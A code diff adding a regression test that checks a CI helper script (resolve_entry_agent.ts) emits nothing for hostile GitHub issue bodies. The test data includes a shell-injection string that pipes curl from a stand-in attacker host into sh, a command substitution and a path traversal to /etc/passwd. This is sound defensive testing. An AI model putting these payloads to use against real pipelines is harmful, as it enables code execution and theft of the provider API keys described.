@@ -1048,6 +1048,31 @@ describe("resolve_entry_agent.ts", () => {
     expect(out.trim()).toBe("");
     rmSync(dir, { recursive: true, force: true });
   });
+
+  // This is the regression test for a shell injection, not a tidiness check.
+  // Whatever this script emits as `agent` is interpolated into shell text by
+  // atoma-runner (`AGENT="${{ inputs.agent }}"`) in a job holding the provider
+  // API keys, and `issues.opened` carries a body the triggering user wrote. So
+  // the assertion that matters is that nothing is emitted at all.
+  test.each([
+    ['/engineer"; curl evil.example.com | sh; #', "a quote escaping the shell string"],
+    ["/engineer$(id)", "a command substitution"],
+    ["/engineer implement the thing", "instructions on the command line"],
+    ["/Engineer", "an uppercase name"],
+    ["/../../etc/passwd", "a path traversal"],
+  ])("emits nothing for '%s' (%s)", async (body) => {
+    const dir = mkdtempSync(join(tmpdir(), "atoma-test-"));
+    const eventFile = join(dir, "event.json");
+    const outputFile = join(dir, "out");
+    writeFileSync(eventFile, JSON.stringify({ issue: { body } }));
+    writeFileSync(outputFile, "");
+    spawnSync("bun", ["run", `${SCRIPTS_DIR}/resolve_entry_agent.ts`], {
+      encoding: "utf8",
+      env: { ...process.env, GITHUB_EVENT_PATH: eventFile, GITHUB_OUTPUT: outputFile, NUMBER: "1", SENDER: "x" },
+    });
+    expect((await Bun.file(outputFile).text()).trim()).toBe("");
+    rmSync(dir, { recursive: true, force: true });
+  });
 });
 
 describe("manage_in_progress_label.ts", () => {
